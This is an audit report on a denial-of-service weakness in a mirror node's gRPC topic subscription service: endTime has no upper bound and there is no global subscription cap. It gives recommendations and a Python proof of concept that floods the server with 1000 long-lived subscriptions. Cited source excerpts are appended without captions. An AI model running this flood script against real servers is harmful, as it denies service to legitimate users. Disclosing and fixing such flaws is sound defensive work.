Audit Report

## Title
Unbounded `endTime` with No Subscription Limit Enables Reactive Pipeline Resource Exhaustion via gRPC Topic Subscriptions

## Summary
`TopicMessageFilter` enforces no upper bound on `endTime`, and `TopicMessageServiceImpl.subscribeTopic()` enforces no global limit on concurrent subscriptions. An unprivileged attacker can open arbitrarily many gRPC connections, each carrying up to 5 calls per the per-connection cap, holding live reactive pipelines open until `endTime + 30 s` elapses, draining the shared `boundedElastic` scheduler, and heap.

## Finding Description

**No upper bound on `endTime`**

`TopicMessageFilter.isValidEndTime()` only requires `endTime > startTime`: [1](#0-0) 

`isValidStartTime()` only requires `startTime <= DomainUtils.now()`: [2](#0-1) 

There is no constraint preventing `endTime = now + 1 year`. An attacker sets `startTime = now` (passes validation) and `endTime = now + 1 year`.

**`isComplete()` keeps the pipeline alive until `endTime + 30 s`**

`TopicContext.isComplete()` returns `true` only after `filter.getEndTime() + endTimeInterval` has elapsed, where `endTimeInterval` defaults to 30 s: [3](#0-2) 

`pastEndTime()` polls `isComplete()` every `endTimeInterval` (30 s): [4](#0-3) 

**Per-subscription resource consumption**

Each `subscribeTopic()` call schedules a safety-check `Mono.delay` on `Schedulers.boundedElastic()`: [5](#0-4) 

When `listener.type=POLL` (non-default but operator-selectable), `PollingTopicListener` creates a **per-subscription** `Schedulers.boundedElastic()` scheduler and polls the DB every 500 ms (default `interval`): [6](#0-5) 

The default `interval` is 500 ms: [7](#0-6) 

Even with the default `REDIS` listener type, the safety-check `boundedElastic` slot and the `pastEndTime` polling loop are still allocated per subscription.

**No global subscription limit**

`subscriberCount` is registered as a Micrometer gauge only and is **never checked** before accepting a new subscription: [8](#0-7) 

**Per-connection cap is trivially bypassed**

`maxConcurrentCallsPerConnection = 5` limits calls per single TCP connection, not globally: [9](#0-8) [10](#0-9) 

Opening N connections × 5 calls each = 5N concurrent subscriptions with no server-side rejection.

**No gRPC-layer rate limiting**

`ThrottleConfiguration` and `ThrottleManagerImpl` are scoped exclusively to the `web3` module and operate on `ContractCallRequest` objects: [11](#0-10) [12](#0-11) 

They are never applied to gRPC topic subscriptions.

## Impact Explanation

Each open subscription consumes:
- One `boundedElastic` worker slot for the safety-check `Mono.delay` (regardless of listener type)
- Additional `boundedElastic` slots per subscription when `listener.type=POLL`
- Periodic DB queries every 500 ms per subscription under `POLL` mode (DB connection pool exhaustion)
- Heap for the reactive pipeline, `TopicContext`, and buffered messages

With `endTime = now + 1 hour`, each subscription stays alive for `1 hour + 30 s`. Flooding with thousands of subscriptions exhausts the `boundedElastic` thread pool (Reactor default: `10 × CPU cores`), starves legitimate subscribers of scheduler threads, and under `POLL` mode saturates the DB connection pool — resulting in denial of service for all gRPC topic consumers.

## Likelihood Explanation

The attack requires only:
- Network access to the gRPC port (port 5600, publicly exposed in typical deployments)
- Knowledge of any valid `topicId` (publicly enumerable via the REST API)
- A standard gRPC client library

No credentials, tokens, or on-chain funds are needed. The attack is trivially scriptable and repeatable by cycling connections.

## Recommendation

1. **Enforce a maximum `endTime` window**: Add a `@Max`-style constraint or custom `@AssertTrue` in `TopicMessageFilter` limiting `endTime - startTime` to a configurable maximum (e.g., 1 hour). [1](#0-0) 

2. **Enforce a global subscription limit**: Check `subscriberCount` against a configurable maximum in `subscribeTopic()` and reject with `RESOURCE_EXHAUSTED` when exceeded. [13](#0-12) 

3. **Add per-IP or per-connection rate limiting** at the gRPC layer (e.g., via a `ServerInterceptor`) to limit the rate of new `subscribeTopic` calls.

4. **Limit `maxConcurrentCallsPerConnection` globally** using Netty's `maxConnectionsTotal` or a gRPC `ServerInterceptor` that tracks global active streams.

## Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2
import time

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234          # any valid topic
CONNECTIONS = 200         # N connections
CALLS_PER_CONN = 5        # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now = int(time.time())
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=now),
        consensusEndTime=timestamp_pb2.Timestamp(seconds=now + 3600),  # 1 hour endTime
    )
    streams = [stub.subscribeTopic(query) for _ in range(CALLS_PER_CONN)]
    # Hold streams open
    for s in streams:
        try:
            for _ in s:
                pass
        except:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads:
    t.start()
# 200 connections × 5 calls = 1000 concurrent subscriptions, each alive for ~3600s
```

This opens 1000 concurrent subscriptions (200 connections × 5 calls each), each holding a `boundedElastic` slot and a live reactive pipeline for 1 hour + 30 s, with no server-side rejection.

    @Override
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }

        if (topicContext.getFilter().getEndTime() == null) {

final class ThrottleManagerImpl implements ThrottleManager {

    static final String REQUEST_PER_SECOND_LIMIT_EXCEEDED = "Requests per second rate limit exceeded";
    static final String GAS_PER_SECOND_LIMIT_EXCEEDED = "Gas per second rate limit exceeded.";

    @Qualifier(GAS_LIMIT_BUCKET)
    private final Bucket gasLimitBucket;

    @Qualifier(RATE_LIMIT_BUCKET)
    private final Bucket rateLimitBucket;

    @Qualifier(OPCODE_RATE_LIMIT_BUCKET)
    private final Bucket opcodeRateLimitBucket;

    private final ThrottleProperties throttleProperties;

    @Override
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }

        for (var requestFilter : throttleProperties.getRequest()) {
            if (requestFilter.test(request)) {
                action(requestFilter, request);
            }
        }
    }
